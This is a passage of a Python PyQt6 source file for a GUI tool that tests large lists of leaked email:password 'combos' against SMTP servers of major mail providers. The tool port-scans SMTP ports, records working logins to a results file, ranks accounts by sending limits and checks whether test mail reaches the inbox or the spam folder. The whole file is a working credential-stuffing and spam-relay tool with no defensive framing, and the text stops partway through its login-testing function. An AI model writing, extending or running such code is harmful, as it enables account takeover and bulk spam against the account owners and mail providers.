import sys
import os
import smtplib
import imaplib
import email
import socket
import threading
import queue
import re
import time
import mmap
import gc
import json
import webbrowser
import tempfile
import uuid
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                            QTextEdit, QFileDialog, QProgressBar, QSpinBox,
                            QTableWidget, QTableWidgetItem, QHeaderView, QMenu,
                            QTabWidget, QDialog, QDialogButtonBox, QMessageBox,
                            QRadioButton, QButtonGroup, QComboBox, QCheckBox,
                            QGroupBox, QGridLayout, QSplitter, QFrame, QScrollArea,
                            QToolTip, QStatusBar, QMenuBar, QToolBar)
from PyQt6.QtCore import Qt, pyqtSignal, QObject, QThread, QTimer, QSize, QPropertyAnimation, QEasingCurve, QRect
from PyQt6.QtGui import QColor, QCursor, QFont, QPixmap, QPainter, QBrush, QLinearGradient, QIcon, QPalette
import socket
import dns.resolver
import asyncio
import aiofiles

class InboxSpamChecker:
    """Advanced inbox/spam detection system"""
    def __init__(self):
        self.cache = {}
        self.dns_cache = {}
        
    def resolve_imap_hosts(self, domain):
        """Automatically resolve IMAP hosts for domain"""
        if domain in self.dns_cache:
            return self.dns_cache[domain]
        
        hosts = []
        try:
            # Known provider mappings
            if 'gmail' in domain.lower():
                hosts = ['imap.gmail.com']
            elif any(x in domain.lower() for x in ['outlook', 'hotmail', 'live', 'msn']):
                hosts = ['imap-mail.outlook.com', 'outlook.office365.com']
            elif 'yahoo' in domain.lower():
                hosts = ['imap.mail.yahoo.com']
            elif 'icloud' in domain.lower():
                hosts = ['imap.mail.me.com']
            elif 'aol' in domain.lower():
                hosts = ['imap.aol.com']
            else:
                # Generic attempts
                hosts = [
                    f"imap.{domain}",
                    f"mail.{domain}",
                    f"imap4.{domain}",
                    domain
                ]
            
            # Validate hosts
            validated_hosts = []
            for host in hosts:
                try:
                    socket.gethostbyname(host)
                    validated_hosts.append(host)
                except:
                    continue
            
            self.dns_cache[domain] = validated_hosts
            return validated_hosts
            
        except:
            return []
    
    def check_inbox_or_spam(self, check_email, check_password, test_subject, timeout=30):
        """
        Check if email landed in inbox or spam folder
        Returns: 'inbox', 'spam', 'not_found', or 'error'
        """
        try:
            domain = check_email.split('@')[1]
            imap_hosts = self.resolve_imap_hosts(domain)
            
            if not imap_hosts:
                return 'error'
            
            for host in imap_hosts:
                try:
                    # Connect to IMAP server
                    mail = imaplib.IMAP4_SSL(host, 993)
                    mail.login(check_email, check_password)
                    
                    # Check inbox first
                    mail.select('INBOX')
                    typ, data = mail.search(None, f'SUBJECT "{test_subject}"')
                    
                    if data[0]:
                        mail.logout()
                        return 'inbox'
                    
                    # Check spam/junk folders
                    spam_folders = ['Spam', 'Junk', 'Bulk', '[Gmail]/Spam', 'INBOX.Spam']
                    for folder in spam_folders:
                        try:
                            mail.select(folder)
                            typ, data = mail.search(None, f'SUBJECT "{test_subject}"')
                            if data[0]:
                                mail.logout()
                                return 'spam'
                        except:
                            continue
                    
                    mail.logout()
                    return 'not_found'
                    
                except Exception:
                    continue
            
            return 'error'
            
        except Exception:
            return 'error'

class AnimatedButton(QPushButton):
    """Custom animated button with hover effects"""
    def __init__(self, text, color="#3498db"):
        super().__init__(text)
        self.base_color = color
        self.hover_color = self.lighten_color(color)
        self.setStyleSheet(self.get_base_style())
        
    def lighten_color(self, color):
        """Lighten a hex color by 20%"""
        color = color.lstrip('#')
        rgb = tuple(int(color[i:i+2], 16) for i in (0, 2, 4))
        lightened = tuple(min(255, int(c * 1.2)) for c in rgb)
        return f"#{lightened[0]:02x}{lightened[1]:02x}{lightened[2]:02x}"
    
    def get_base_style(self):
        return f"""
            QPushButton {{
                background: {self.base_color};
                border: none;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                padding: 10px 20px;
                font-size: 12px;
            }}
            QPushButton:hover {{
                background: {self.hover_color};
                transform: translateY(-2px);
            }}
            QPushButton:pressed {{
                background: {self.base_color};
                transform: translateY(0px);
            }}
        """

class ModernStatsCard(QFrame):
    """Modern animated statistics card"""
    def __init__(self, title, value="0", icon="📊", color="#3498db"):
        super().__init__()
        self.title = title
        self.current_value = value
        self.target_value = value
        self.color = color
        
        self.setFixedHeight(120)
        self.setStyleSheet(f"""
            QFrame {{
                background: white;
                border-radius: 12px;
                border: 1px solid #e0e0e0;
            }}
            QFrame:hover {{
                border: 2px solid {color};
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            }}
        """)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(15, 15, 15, 15)
        
        # Icon and title row
        header_layout = QHBoxLayout()
        
        icon_label = QLabel(icon)
        icon_label.setStyleSheet(f"font-size: 24px; color: {color};")
        
        title_label = QLabel(title)
        title_label.setStyleSheet(f"font-size: 12px; color: #666; font-weight: bold;")
        
        header_layout.addWidget(icon_label)
        header_layout.addStretch()
        header_layout.addWidget(title_label)
        
        # Value label
        self.value_label = QLabel(value)
        self.value_label.setStyleSheet(f"""
            font-size: 28px; 
            font-weight: bold; 
            color: {color};
            margin: 10px 0;
        """)
        self.value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        layout.addLayout(header_layout)
        layout.addWidget(self.value_label)
    
    def update_value(self, new_value):
        """Update value with animation effect"""
        self.target_value = str(new_value)
        self.value_label.setText(self.target_value)

class UltraCache:
    """Ultra-fast caching system with TTL and size limits"""
    def __init__(self, max_size=10000, ttl=300):
        self.cache = {}
        self.access_times = {}
        self.max_size = max_size
        self.ttl = ttl
        self.lock = threading.RLock()
    
    def get(self, key):
        with self.lock:
            if key in self.cache:
                entry_time = self.access_times.get(key, 0)
                if time.time() - entry_time < self.ttl:
                    self.access_times[key] = time.time()
                    return self.cache[key]
                else:
                    # Expired
                    del self.cache[key]
                    del self.access_times[key]
            return None
    
    def set(self, key, value):
        with self.lock:
            if len(self.cache) >= self.max_size:
                # Remove oldest entries
                oldest_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
                del self.cache[oldest_key]
                del self.access_times[oldest_key]
            
            self.cache[key] = value
            self.access_times[key] = time.time()
    
    def clear_expired(self):
        with self.lock:
            current_time = time.time()
            expired_keys = [k for k, t in self.access_times.items() if current_time - t > self.ttl]
            for key in expired_keys:
                del self.cache[key]
                del self.access_times[key]

class DNSCache:
    """Aggressive DNS caching with fallback mechanisms"""
    def __init__(self):
        self.cache = UltraCache(max_size=5000, ttl=600)  # 10 min TTL
        self.failed_domains = set()
        self.lock = threading.RLock()
    
    def resolve_smtp_hosts(self, domain):
        cached = self.cache.get(domain)
        if cached:
            return cached
        
        if domain in self.failed_domains:
            return []
        
        hosts = []
        try:
            # Priority order for different providers
            if 'gmail' in domain.lower():
                hosts = ['smtp.gmail.com']
            elif any(x in domain.lower() for x in ['outlook', 'hotmail', 'live', 'msn']):
                hosts = ['smtp-mail.outlook.com', 'smtp.live.com', 'smtp.office365.com']
            elif 'yahoo' in domain.lower():
                hosts = ['smtp.mail.yahoo.com', 'plus.smtp.mail.yahoo.com']
            elif 'icloud' in domain.lower():
                hosts = ['smtp.mail.me.com']
            elif 'aol' in domain.lower():
                hosts = ['smtp.aol.com']
            else:
                # Generic attempts
                hosts = [
                    f"smtp.{domain}",
                    f"mail.{domain}",
                    f"smtpout.{domain}",
                    f"outgoing.{domain}",
                    f"send.{domain}",
                    domain
                ]
            
            # Validate hosts exist
            validated_hosts = []
            for host in hosts:
                try:
                    socket.gethostbyname(host)
                    validated_hosts.append(host)
                except:
                    continue
            
            if validated_hosts:
                self.cache.set(domain, validated_hosts)
                return validated_hosts
            else:
                self.failed_domains.add(domain)
                return []
                
        except Exception:
            self.failed_domains.add(domain)
            return []

class ConnectionPool:
    """Connection pooling for SMTP connections"""
    def __init__(self, max_size=50):
        self.pool = queue.Queue(maxsize=max_size)
        self.active_connections = {}
        self.lock = threading.RLock()
        self.max_size = max_size
    
    def get_connection(self, host, port):
        key = f"{host}:{port}"
        
        try:
            connection = self.pool.get_nowait()
            if connection and connection.get('key') == key:
                # Validate connection
                try:
                    connection['server'].noop()
                    return connection['server']
                except:
                    pass
        except queue.Empty:
            pass
        
        return None
    
    def return_connection(self, host, port, server):
        if self.pool.qsize() < self.max_size:
            try:
                self.pool.put_nowait({
                    'key': f"{host}:{port}",
                    'server': server,
                    'timestamp': time.time()
                })
            except queue.Full:
                try:
                    server.quit()
                except:
                    pass

class LargeFileHandler:
    """Memory-mapped file handler for large combo files"""
    def __init__(self, filename, chunk_size=1024*1024):  # 1MB chunks
        self.filename = filename
        self.chunk_size = chunk_size
        self.file_size = os.path.getsize(filename)
        self.total_lines = 0
        self.valid_combos = 0
        self._count_lines()
    
    def _count_lines(self):
        """Count total lines efficiently"""
        try:
            with open(self.filename, 'rb') as f:
                self.total_lines = sum(1 for _ in f)
        except:
            self.total_lines = 0
    
    def load_combos_generator(self, progress_callback=None):
        """Generator that yields validated combos without loading all into memory"""
        try:
            if self.file_size > 50 * 1024 * 1024:  # > 50MB, use mmap
                with open(self.filename, 'rb') as f:
                    with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        lines_processed = 0
                        line_start = 0
                        
                        for i in range(len(mm)):
                            if mm[i] == ord('\n') or i == len(mm) - 1:
                                line = mm[line_start:i].decode('utf-8', errors='ignore').strip()
                                line_start = i + 1
                                lines_processed += 1
                                
                                if self._validate_combo(line):
                                    self.valid_combos += 1
                                    yield line
                                
                                if progress_callback and lines_processed % 1000 == 0:
                                    progress_callback(lines_processed, self.total_lines)
            else:
                # Regular file reading for smaller files
                with open(self.filename, 'r', encoding='utf-8', errors='ignore') as f:
                    lines_processed = 0
                    for line in f:
                        line = line.strip()
                        lines_processed += 1
                        
                        if self._validate_combo(line):
                            self.valid_combos += 1
                            yield line
                        
                        if progress_callback and lines_processed % 1000 == 0:
                            progress_callback(lines_processed, self.total_lines)
                            
        except Exception as e:
            print(f"Error loading combos: {e}")
    
    def _validate_combo(self, line):
        """Ultra-fast combo validation"""
        if not line or len(line) < 6:
            return False
        
        colon_pos = line.find(':')
        if colon_pos == -1 or colon_pos == 0 or colon_pos == len(line) - 1:
            return False
        
        email_part = line[:colon_pos]
        at_pos = email_part.find('@')
        if at_pos == -1 or at_pos == 0 or at_pos == len(email_part) - 1:
            return False
        
        domain_part = email_part[at_pos + 1:]
        if '.' not in domain_part or len(domain_part) < 3:
            return False
        
        return True

class AsyncResultWriter:
    """Asynchronous result writer to avoid I/O blocking"""
    def __init__(self, filename='validsend.txt'):
        self.filename = filename
        self.write_queue = queue.Queue()
        self.writer_thread = None
        self.running = False
        self.lock = threading.Lock()
    
    def start(self):
        with self.lock:
            if not self.running:
                self.running = True
                self.writer_thread = threading.Thread(target=self._write_worker, daemon=True)
                self.writer_thread.start()
    
    def stop(self):
        with self.lock:
            self.running = False
            self.write_queue.put(None)  # Signal to stop
    
    def write_async(self, data):
        if self.running:
            self.write_queue.put(data)
    
    def _write_worker(self):
        """Background worker for writing results"""
        buffer = []
        last_write = time.time()
        
        while self.running:
            try:
                item = self.write_queue.get(timeout=1.0)
                if item is None:  # Stop signal
                    break
                
                buffer.append(item)
                
                # Write in batches or every 5 seconds
                if len(buffer) >= 10 or time.time() - last_write > 5:
                    self._flush_buffer(buffer)
                    buffer = []
                    last_write = time.time()
                    
            except queue.Empty:
                # Flush remaining buffer
                if buffer:
                    self._flush_buffer(buffer)
                    buffer = []
                    last_write = time.time()
        
        # Final flush
        if buffer:
            self._flush_buffer(buffer)
    
    def _flush_buffer(self, buffer):
        """Flush buffer to file"""
        try:
            with open(self.filename, 'a', encoding='utf-8') as f:
                for item in buffer:
                    f.write(f"{item}\n")
        except Exception as e:
            print(f"Error writing to file: {e}")

class WorkerSignals(QObject):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    valid_smtp = pyqtSignal(str, str, dict)  # Added stats dict
    finished = pyqtSignal()
    stats_update = pyqtSignal(dict)
    inbox_spam_result = pyqtSignal(str, str)  # email, result (inbox/spam)

class RealTimeStats:
    """Real-time statistics tracking"""
    def __init__(self):
        self.lock = threading.RLock()
        self.reset()
    
    def reset(self):
        with self.lock:
            self.start_time = time.time()
            self.processed = 0
            self.valid_found = 0
            self.rate_limits = 0
            self.size_limits = 0
            self.unknown_limits = 0
            self.inbox_count = 0
            self.spam_count = 0
            self.ports_found = defaultdict(int)
            self.providers_found = defaultdict(int)
            self.speed_history = deque(maxlen=30)  # Last 30 measurements
            self.last_speed_calc = time.time()
            self.last_processed = 0
    
    def update(self, processed_delta=0, valid_delta=0, port=None, domain=None, 
               limit_type=None, inbox_delta=0, spam_delta=0):
        with self.lock:
            self.processed += processed_delta
            self.valid_found += valid_delta
            self.inbox_count += inbox_delta
            self.spam_count += spam_delta
            
            if port:
                self.ports_found[port] += 1
            
            if domain:
                # Extract provider from domain
                provider = self._extract_provider(domain)
                self.providers_found[provider] += 1
            
            if limit_type:
                if limit_type == "rate":
                    self.rate_limits += 1
                elif limit_type == "size":
                    self.size_limits += 1
                else:
                    self.unknown_limits += 1
            
            # Calculate speed
            current_time = time.time()
            if current_time - self.last_speed_calc >= 1.0:  # Update every second
                speed = (self.processed - self.last_processed) / (current_time - self.last_speed_calc)
                self.speed_history.append(speed)
                self.last_speed_calc = current_time
                self.last_processed = self.processed
    
    def _extract_provider(self, domain):
        domain_lower = domain.lower()
        if 'gmail' in domain_lower:
            return 'Gmail'
        elif any(x in domain_lower for x in ['outlook', 'hotmail', 'live']):
            return 'Outlook'
        elif 'yahoo' in domain_lower:
            return 'Yahoo'
        elif 'icloud' in domain_lower:
            return 'iCloud'
        else:
            return 'Other'
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            avg_speed = self.processed / elapsed if elapsed > 0 else 0
            current_speed = sum(self.speed_history) / len(self.speed_history) if self.speed_history else 0
            
            return {
                'processed': self.processed,
                'valid_found': self.valid_found,
                'elapsed': elapsed,
                'avg_speed': avg_speed,
                'current_speed': current_speed,
                'rate_limits': self.rate_limits,
                'size_limits': self.size_limits,
                'unknown_limits': self.unknown_limits,
                'inbox_count': self.inbox_count,
                'spam_count': self.spam_count,
                'ports_found': dict(self.ports_found),
                'providers_found': dict(self.providers_found),
                'success_rate': (self.valid_found / self.processed * 100) if self.processed > 0 else 0,
                'inbox_rate': (self.inbox_count / self.valid_found * 100) if self.valid_found > 0 else 0,
                'spam_rate': (self.spam_count / self.valid_found * 100) if self.valid_found > 0 else 0
            }

class EnhancedSortableTableWidget(QTableWidget):
    """Enhanced table with modern design and inbox/spam visualization"""
    def __init__(self, rows, columns):
        super().__init__(rows, columns)
        self.horizontalHeader().sectionClicked.connect(self.on_header_clicked)
        self.setAlternatingRowColors(True)
        self.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.setShowGrid(False)
        
        # Modern styling
        self.setStyleSheet("""
            QTableWidget {
                gridline-color: #e0e0e0;
                background-color: white;
                alternate-background-color: #f8f9fa;
                border: 1px solid #dee2e6;
                border-radius: 8px;
            }
            QTableWidget::item {
                padding: 8px;
                border: none;
            }
            QTableWidget::item:selected {
                background-color: #e3f2fd;
                color: #1976d2;
            }
            QHeaderView::section {
                background-color: #f8f9fa;
                color: #495057;
                padding: 10px;
                border: 1px solid #dee2e6;
                font-weight: bold;
            }
            QHeaderView::section:hover {
                background-color: #e9ecef;
            }
        """)
        
    def on_header_clicked(self, logical_index):
        """Handle header click for custom sorting"""
        column_name = self.horizontalHeaderItem(logical_index).text()
        
        if column_name == "Type":
            self.show_type_sort_menu(logical_index)
        elif column_name == "Limit":
            self.show_limit_sort_menu(logical_index)
        elif column_name == "Port":
            self.show_port_sort_menu(logical_index)
        elif column_name == "Provider":
            self.show_provider_sort_menu(logical_index)
        elif column_name == "Delivery":
            self.show_delivery_sort_menu(logical_index)
        else:
            # Default sorting for other columns
            self.sortItems(logical_index, Qt.SortOrder.AscendingOrder)
    
    def show_delivery_sort_menu(self, column_index):
        """Sort by delivery status (inbox/spam)"""
        menu = QMenu(self)
        
        inbox_first_action = menu.addAction("📥 Inbox First")
        spam_first_action = menu.addAction("🗑️ Spam First")
        unknown_first_action = menu.addAction("❓ Unknown First")
        
        action = menu.exec(QCursor.pos())
        
        if action == inbox_first_action:
            self.sort_by_delivery("📥 Inbox")
        elif action == spam_first_action:
            self.sort_by_delivery("🗑️ Spam")
        elif action == unknown_first_action:
            self.sort_by_delivery("❓ Unknown")
    
    def sort_by_delivery(self, priority_delivery):
        """Sort by delivery status"""
        rows_data = self._get_all_rows_data()
        
        def delivery_sort_key(row):
            delivery = row[8] if len(row) > 8 else "❓ Unknown"  # Delivery column
            if delivery == priority_delivery:
                return 0
            elif "📥 Inbox" in delivery:
                return 1
            elif "🗑️ Spam" in delivery:
                return 2
            else:
                return 3
        
        rows_data.sort(key=delivery_sort_key)
        self.populate_table_with_data(rows_data)
    
    def show_type_sort_menu(self, column_index):
        """Enhanced type sorting menu"""
        menu = QMenu(self)
        
        rate_limit_action = menu.addAction("⚡ Rate Limit First")
        size_limit_action = menu.addAction("📦 Size Limit First")
        unknown_action = menu.addAction("❓ Unknown First")
        high_limit_action = menu.addAction("🔥 High Limits First")
        
        action = menu.exec(QCursor.pos())
        
        if action == rate_limit_action:
            self.sort_by_type("⚡ Rate Limit")
        elif action == size_limit_action:
            self.sort_by_type("📦 Size Limit")
        elif action == unknown_action:
            self.sort_by_type("❓ Unknown")
        elif action == high_limit_action:
            self.sort_by_limit_value(descending=True)
    
    def show_limit_sort_menu(self, column_index):
        """Enhanced limit sorting menu"""
        menu = QMenu(self)
        
        high_to_low_action = menu.addAction("📈 High to Low")
        low_to_high_action = menu.addAction("📉 Low to High")
        by_type_action = menu.addAction("🔄 Group by Type")
        unlimited_first_action = menu.addAction("∞ Unlimited First")
        
        action = menu.exec(QCursor.pos())
        
        if action == high_to_low_action:
            self.sort_by_limit_value(descending=True)
        elif action == low_to_high_action:
            self.sort_by_limit_value(descending=False)
        elif action == by_type_action:
            self.sort_by_limit_type()
        elif action == unlimited_first_action:
            self.sort_by_unlimited_first()
    
    def show_port_sort_menu(self, column_index):
        """Enhanced port sorting menu"""
        menu = QMenu(self)
        
        ascending_action = menu.addAction("🔢 Low to High")
        descending_action = menu.addAction("🔢 High to Low")
        by_common_action = menu.addAction("⭐ Common Ports First")
        by_secure_action = menu.addAction("🔒 Secure Ports First")
        
        action = menu.exec(QCursor.pos())
        
        if action == ascending_action:
            self.sortItems(column_index, Qt.SortOrder.AscendingOrder)
        elif action == descending_action:
            self.sortItems(column_index, Qt.SortOrder.DescendingOrder)
        elif action == by_common_action:
            self.sort_by_common_ports()
        elif action == by_secure_action:
            self.sort_by_secure_ports()
    
    def show_provider_sort_menu(self, column_index):
        """Provider sorting menu"""
        menu = QMenu(self)
        
        gmail_first_action = menu.addAction("📧 Gmail First")
        outlook_first_action = menu.addAction("📨 Outlook First")
        popular_first_action = menu.addAction("⭐ Popular First")
        alphabetical_action = menu.addAction("🔤 Alphabetical")
        
        action = menu.exec(QCursor.pos())
        
        if action == gmail_first_action:
            self.sort_by_provider("Gmail")
        elif action == outlook_first_action:
            self.sort_by_provider("Outlook")
        elif action == popular_first_action:
            self.sort_by_provider_popularity()
        elif action == alphabetical_action:
            self.sortItems(column_index, Qt.SortOrder.AscendingOrder)
    
    def sort_by_provider(self, priority_provider):
        """Sort by specific provider first"""
        rows_data = self._get_all_rows_data()
        
        def provider_sort_key(row):
            provider = row[7] if len(row) > 7 else ""  # Provider column
            if provider == priority_provider:
                return 0
            elif provider in ["Gmail", "Outlook", "Yahoo", "iCloud"]:
                return 1
            else:
                return 2
        
        rows_data.sort(key=provider_sort_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_provider_popularity(self):
        """Sort by provider popularity"""
        rows_data = self._get_all_rows_data()
        
        popularity_order = ["Gmail", "Outlook", "Yahoo", "iCloud", "Other"]
        
        def popularity_sort_key(row):
            provider = row[7] if len(row) > 7 else "Other"
            try:
                return popularity_order.index(provider)
            except ValueError:
                return len(popularity_order)
        
        rows_data.sort(key=popularity_sort_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_secure_ports(self):
        """Sort by secure ports (465, 587) first"""
        rows_data = self._get_all_rows_data()
        
        def secure_port_key(row):
            port = row[1]  # Port column
            if port in ['465', '587']:
                return 0  # Secure ports first
            elif port == '25':
                return 2  # Unencrypted last
            else:
                return 1  # Other ports in middle
        
        rows_data.sort(key=secure_port_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_unlimited_first(self):
        """Sort unlimited/high limits first"""
        rows_data = self._get_all_rows_data()
        
        def unlimited_sort_key(row):
            limit_text = row[4].lower()  # Limit column
            if 'unlimited' in limit_text or 'no limit' in limit_text:
                return 0
            # Extract numerical value for comparison
            numbers = re.findall(r'\d+', limit_text)
            if numbers:
                value = int(numbers[0])
                if 'mb' in limit_text and value >= 100:
                    return 1  # High size limits
                elif any(x in limit_text for x in ['/hour', '/day']) and value >= 1000:
                    return 1  # High rate limits
                else:
                    return 2
            return 3
        
        rows_data.sort(key=unlimited_sort_key)
        self.populate_table_with_data(rows_data)
    
    def _get_all_rows_data(self):
        """Get all table data"""
        rows_data = []
        for row in range(self.rowCount()):
            row_data = []
            for col in range(self.columnCount()):
                item = self.item(row, col)
                row_data.append(item.text() if item else "")
            rows_data.append(row_data)
        return rows_data
    
    def sort_by_type(self, priority_type):
        """Sort table by Type column with priority"""
        rows_data = self._get_all_rows_data()
        
        def type_sort_key(row):
            type_text = row[5] if len(row) > 5 else ""  # Type column
            if type_text == priority_type:
                return 0
            elif "⚡ Rate Limit" in type_text:
                return 1
            elif "📦 Size Limit" in type_text:
                return 2
            else:
                return 3
        
        rows_data.sort(key=type_sort_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_limit_value(self, descending=True):
        """Sort by numerical value in limit"""
        rows_data = self._get_all_rows_data()
        
        def limit_value_key(row):
            limit_text = row[4] if len(row) > 4 else ""  # Limit column
            if 'unlimited' in limit_text.lower():
                return float('inf') if descending else 0
            
            numbers = re.findall(r'\d+', limit_text)
            if numbers:
                value = int(numbers[0])
                if 'MB' in limit_text:
                    return value * 1000000
                elif 'KB' in limit_text:
                    return value * 1000
                elif '/day' in limit_text:
                    return value * 24
                else:
                    return value
            return 0
        
        rows_data.sort(key=limit_value_key, reverse=descending)
        self.populate_table_with_data(rows_data)
    
    def sort_by_limit_type(self):
        """Sort by limit type"""
        rows_data = self._get_all_rows_data()
        
        def limit_type_key(row):
            limit_text = row[4] if len(row) > 4 else ""
            if any(x in limit_text for x in ['/hour', '/day', '/min']):
                return 0
            elif any(x in limit_text for x in ['MB', 'KB', 'B']):
                return 1
            else:
                return 2
        
        rows_data.sort(key=limit_type_key)
        self.populate_table_with_data(rows_data)
    
    def sort_by_common_ports(self):
        """Sort by common SMTP ports first"""
        rows_data = self._get_all_rows_data()
        
        common_ports = ['587', '465', '25', '2525']
        
        def port_priority_key(row):
            port = row[1] if len(row) > 1 else ""
            if port in common_ports:
                return common_ports.index(port)
            else:
                return len(common_ports) + int(port) if port.isdigit() else 9999
        
        rows_data.sort(key=port_priority_key)
        self.populate_table_with_data(rows_data)
    
    def populate_table_with_data(self, rows_data):
        """Repopulate table with sorted data"""
        self.setRowCount(0)
        
        for row_data in rows_data:
            row = self.rowCount()
            self.insertRow(row)
            
            # Determine row color based on delivery status
            delivery_status = row_data[8] if len(row_data) > 8 else "❓ Unknown"
            
            if "📥 Inbox" in delivery_status:
                row_color = QColor(200, 255, 200)  # Green for inbox
            elif "🗑️ Spam" in delivery_status:
                row_color = QColor(255, 215, 180)  # Orange for spam
            else:
                # Fallback to limit-based coloring
                limit = row_data[4] if len(row_data) > 4 else ""
                if any(x in limit for x in ["/hour", "/day", "/min"]):
                    row_color = QColor(144, 238, 144)  # Light green
                elif any(x in limit for x in ["MB", "KB", "B"]):
                    row_color = QColor(255, 255, 224)  # Light yellow
                else:
                    row_color = QColor(245, 245, 245)  # Light gray
            
            for col, text in enumerate(row_data):
                if col < self.columnCount():
                    item = QTableWidgetItem(text)
                    item.setBackground(row_color)
                    self.setItem(row, col, item)

class UltraFastSMTPWorkerWithDetection(QThread):
    """Enhanced SMTP worker with inbox/spam detection"""
    def __init__(self, combo_generator, test_email, stats, worker_id, 
                 email_mode="credentials", template_data=None, 
                 check_email=None, check_password=None, enable_inbox_check=False):
        super().__init__()
        self.combo_generator = combo_generator
        self.test_email = test_email
        self.stats = stats
        self.worker_id = worker_id
        self.signals = WorkerSignals()
        self.running = True
        self.email_mode = email_mode
        self.template_data = template_data
        
        # Inbox/spam detection
        self.check_email = check_email
        self.check_password = check_password
        self.enable_inbox_check = enable_inbox_check
        self.inbox_checker = InboxSpamChecker() if enable_inbox_check else None
        
        # Ultra-fast caches
        self.dns_cache = DNSCache()
        self.connection_pool = ConnectionPool()
        self.failed_hosts = set()
        self.successful_configs = {}
        
        # Batch processing
        self.batch_size = 5
        self.processed_batch = 0
        
    def ultra_fast_port_scan(self, host, ports, timeout=0.5):
        """Ultra-optimized port scanning"""
        if host in self.failed_hosts:
            return []
        
        available_ports = []
        
        def check_port_ultra_fast(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                result = sock.connect_ex((host, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        # Parallel port checking with thread pool
        try:
            with ThreadPoolExecutor(max_workers=min(len(ports), 4)) as executor:
                futures = {executor.submit(check_port_ultra_fast, port): port for port in ports}
                
                for future in as_completed(futures, timeout=timeout * 2):
                    try:
                        result = future.result(timeout=0.1)
                        if result:
                            available_ports.append(result)
                    except:
                        continue
        except:
            # Fallback
            for port in ports[:2]:  # Only check first 2 ports
                if check_port_ultra_fast(port):
                    available_ports.append(port)
        
        return available_ports

    def get_smtp_limits_ultra_fast(self, server, host):
        """Extract all rate and size limits from EHLO"""
        try:
            cache_key = f"{host}_limits"
            cached = getattr(self, '_limits_cache', {}).get(cache_key)
            if cached:
                return cached

            ehlo_response = ""
            if hasattr(server, 'ehlo_resp') and server.ehlo_resp:
                ehlo_response = server.ehlo_resp.decode('utf-8', errors='ignore').upper()

            found_limits = []
            used_numbers = set()
            
            # Find all rate limits (only reasonable values)
            rate_patterns = [
                (r'RATE[:\s]*(\d+)[/\s]*(HOUR|H|DAY|D)', 2),
                (r'LIMIT[:\s]*(\d+)[/\s]*(HOUR|H|DAY|D)', 2),
                (r'MESSAGES[:\s]*PER[:\s]*(HOUR|DAY)[:\s]*(\d+)', 2),
                (r'(\d+)[/\s]*(HOUR|H|DAY|D)', 2),
                (r'QUOTA[:\s]*(\d+)', 1)
            ]
            
            for pattern, group_count in rate_patterns:
                for match in re.finditer(pattern, ehlo_response, re.IGNORECASE):
                    groups = match.groups()
                    if group_count == 2 and len(groups) >= 2:
                        rate_value = groups[0] if groups[0].isdigit() else groups[1]
                        time_unit = groups[1] if groups[0].isdigit() else groups[0]
                        time_unit = time_unit.lower().replace('h', 'hour').replace('d', 'day')
                        try:
                            rate_int = int(rate_value)
                            if rate_int < 100000:
                                found_limits.append(f"{rate_int}/{time_unit}")
                                used_numbers.add(rate_int)
                        except:
                            continue
                    elif group_count == 1:
                        try:
                            rate_int = int(groups[0])
                            if rate_int < 100000:
                                found_limits.append(f"{rate_int}/hour")
                                used_numbers.add(rate_int)
                        except:
                            continue

            # Find all size limits (only if not already used as rate)
            size_patterns = [
                (r'SIZE[:\s]*(\d+)', 1),
                (r'(\d+)[/\s]*MB', 1)
            ]
            
            for pattern, group_count in size_patterns:
                for match in re.finditer(pattern, ehlo_response, re.IGNORECASE):
                    groups = match.groups()
                    if group_count == 1:
                        try:
                            value = int(groups[0])
                            if value in used_numbers:
                                continue  # Don't add as size if already used as rate
                            if 'MB' in match.group(0):
                                found_limits.append(f"{value}MB")
                            elif value > 1000000:
                                found_limits.append(f"{value//1000000}MB")
                            elif value > 1000:
                                found_limits.append(f"{value//1000}KB")
                            else:
                                found_limits.append(f"{value}B")
                        except:
                            continue

            # Remove duplicates, prioritize rate limits first
            rate_limits = [l for l in found_limits if any(x in l for x in ['/hour', '/day'])]
            size_limits = [l for l in found_limits if any(x in l for x in ['MB', 'KB', 'B'])]
            all_limits = rate_limits + size_limits
            result = ', '.join(dict.fromkeys(all_limits)) if all_limits else "Unknown"

            if not hasattr(self, '_limits_cache'):
                self._limits_cache = {}
            self._limits_cache[cache_key] = result
            return result
        except Exception:
            return "Unknown"

    def lightning_smtp_test(self, email, password):
        """Lightning-fast SMTP testing with all optimizations"""
        domain = email.split('@')[1].lower()
        
        # Skip known bad domains
        bad_domains = {'example.com', 'test.com', 'invalid.com', 'fake.com', 'domain.com', 'mail.com'}
        if domain in bad_domains:
            return False, None, None, None, None, "❓ Unknown"
        
        # Check if we already tested this configuration
        config_key = f"{email}:{password}"
        if config_key in self.successful_configs:
            return True, *self.successful_configs[config_key]
        
        hosts = self.dns_cache.resolve_smtp_hosts(domain)
        if not hosts:
            return False, None, None, None, None, "❓ Unknown"
        
        # Prioritized ports with SSL preference
        ports = [587, 465, 25, 2525]
        
        for host in hosts:
            if not self.running:
                return False, None, None, None, None, "❓ Unknown"
            
            # Ultra-fast port scan
            available_ports = self.ultra_fast_port_scan(host, ports, timeout=0.3)
            
            if not available_ports:
                self.failed_hosts.add(host)
                continue
            
            # Try authentication on available ports
            port_priority = [587, 465, 25, 2525]
